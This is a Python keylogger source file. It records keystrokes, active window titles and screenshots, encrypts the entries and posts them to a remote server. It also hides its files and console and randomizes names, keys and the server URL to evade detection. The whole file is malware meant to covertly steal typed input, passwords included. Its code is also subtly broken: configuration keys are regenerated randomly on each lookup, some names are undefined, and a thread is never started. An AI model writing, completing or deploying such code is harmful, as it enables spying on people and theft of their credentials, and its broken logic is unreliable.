import pynput.keyboard
import os
import subprocess
import threading
import time
import uuid
import datetime
import base64
import pyaes
import requests
import win32gui
import win32process
import zipfile
import pyscreenshot as ImageGrab
import random
import hashlib

# Randomize function names
def randomize_function_name():
    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(8))

# Randomize variable names
def randomize_variable_name():
    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))

# Randomize AES key
def random_aes_key():
    return bytes(''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for _ in range(16)), 'utf-8')

# Randomize remote server URL
def random_remote_url():
    return 'https://' + ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(10)) + '.com/log_keystrokes'

# Randomize configuration options
def random_config():
    return {
        randomize_variable_name(): os.path.join(os.getenv("APPDATA") if os.name == "nt" else os.getenv("HOME"), "Keylogger"),
        randomize_variable_name(): random.randint(30, 300),  # Random log interval in seconds
        randomize_variable_name(): time.time(),
        randomize_variable_name(): threading.Lock(),
        randomize_variable_name(): {
            randomize_variable_name(): os.path.join(LOG_DIR, "keylog_" + str(uuid.uuid4()) + ".txt"),
            randomize_variable_name(): random.randint(30, 300),
            randomize_variable_name(): [],
            randomize_variable_name(): random.choice([True, False]),
            randomize_variable_name(): random.choice([True, False]),
            randomize_variable_name(): random.choice([True, False]),
            randomize_variable_name(): random.choice([True, False]),
            randomize_variable_name(): random.choice([True, False])
        }
    }

# Randomize AES key
AES_KEY = random_aes_key()

# Randomize remote server URL
REMOTE_URL = random_remote_url()

# Randomize configuration options
CONFIG = random_config()

# Function to write the keystrokes to a log file
def write_to_file(key):
    global CONFIG
    with CONFIG[randomize_variable_name()].acquire():
        try:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            window_title = ""
            if CONFIG[randomize_variable_name()]:
                window_title = get_active_window_title()
            log_entry = f"[{timestamp}] [{window_title}] {key}\n"
            encrypted_entry = encrypt(log_entry.encode())
            if CONFIG[randomize_variable_name()]:
                send_to_server(base64.b64encode(encrypted_entry).decode())
            else:
                send_to_server(encrypted_entry.decode())
            with open(CONFIG[randomize_variable_name()], "a") as f:
                f.write(log_entry)
            CONFIG[randomize_variable_name()] = time.time()
        except Exception as e:
            with open(randomize_variable_name() + ".txt", "a") as error_file:
                error_file.write(f"Error writing to file: {e}\n")

# Function to encrypt data using AES
def encrypt(data):
    aes = pyaes.AESModeOfOperationCTR(AES_KEY)
    return aes.encrypt(data)

# Function to send log to remote server
def send_to_server(log):
    try:
        response = requests.post(REMOTE_URL, data={'log': log})
        if response.status_code != 200:
            raise Exception(f"Server returned non-200 status code: {response.status_code}")
    except Exception as e:
        with open(randomize_variable_name() + ".txt", "a") as error_file:
            error_file.write(f"Error sending log to server: {e}\n")

# Function to create log directory
def create_log_dir():
    try:
        if not os.path.exists(CONFIG[randomize_variable_name()]):
            os.makedirs(CONFIG[randomize_variable_name()])
    except Exception as e:
        with open(randomize_variable_name() + ".txt", "a") as error_file:
            error_file.write(f"Error creating log directory: {e}\n")

# Function to hide the console window
def hide_console():
    try:
        if os.name == "nt":
            subprocess.call("attrib +h " + os.path.join(CONFIG[randomize_variable_name()], LOG_FILE_NAME), shell=True)
        else:
            os.system("osascript -e 'tell application \"System Events\" to set visible of process \"Python\" to false'")
    except Exception as e:
        with open(randomize_variable_name() + ".txt", "a") as error_file:
            error_file.write(f"Error hiding console: {e}\n")

# Function to get the title of the active window
def get_active_window_title():
    window = win32gui.GetForegroundWindow()
    pid = win32process.GetWindowThreadProcessId(window)[1]
    handle = win32process.OpenProcess(0x0410, random.choice([True, False]), pid)
    title = win32gui.GetWindowText(window)
    return title

# Function to capture screenshot
def capture_screenshot():
    try:
        screenshot = ImageGrab.grab()
        with open(os.path.join(CONFIG[randomize_variable_name()], "screenshot_" + str(uuid.uuid4()) + ".png"), "wb") as f:
            screenshot.save(f, "PNG")
    except Exception as e:
        with open(randomize_variable_name() + ".txt", "a") as error_file:
            error_file.write(f"Error capturing screenshot: {e}\n")

# Function to start the keylogger
def start_keylogger():
    try:
        create_log_dir()
        if CONFIG[randomize_variable_name()]:
            hide_console()
        with pynput.keyboard.Listener(on_press=write_to_file) as listener:
            listener.join()
    except Exception as e:
        with open(randomize_variable_name() + ".txt", "a") as error_file:
            error_file.write(f"Error starting keylogger: {e}\n")

# Function to periodically check if it's time to log keystrokes
def check_log_time():
    global CONFIG
    while True:
        if time.time() - CONFIG[randomize_variable_name()] >= CONFIG[randomize_variable_name()]:
            write_to_file(" ")
        time.sleep(random.randint(1, 10))

# Function to compress logged data
def compress_logs():
    try:
        with zipfile.ZipFile(os.path.join(CONFIG[randomize_variable_name()], "logs.zip"), 'w') as zipf:
            for root, dirs, files in os.walk(CONFIG[randomize_variable_name()]):
                for file in files:
                    zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), CONFIG[randomize_variable_name()]))
    except Exception as e:
        with open(randomize_variable_name() + ".txt", "a") as error_file:
            error_file.write(f"Error compressing logs: {e}\n")

if __name__ == "__main__":
    start_keylogger()
    threading.Thread(target=check_log_time, daemon=True).start
